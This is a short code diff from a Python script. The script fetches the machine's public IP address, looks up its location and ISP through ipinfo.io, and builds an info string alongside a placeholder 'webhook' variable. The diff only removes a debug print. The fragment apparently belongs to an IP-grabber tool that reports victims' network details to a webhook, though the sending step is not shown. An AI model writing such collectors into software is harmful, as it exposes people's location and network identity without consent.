@@ -41,7 +41,6 @@ webhook = "webhook-link"
 rg = requests.get("http://api.ipify.org/").text
 msg_rg = "IP found : "+rg
 ipinfo = requests.get("http://ipinfo.io/%s/json" % (rg)).json()
-print(ipinfo)
 info = f'''
 IP : {ipinfo['ip']}
 ISP : {ipinfo['org']}
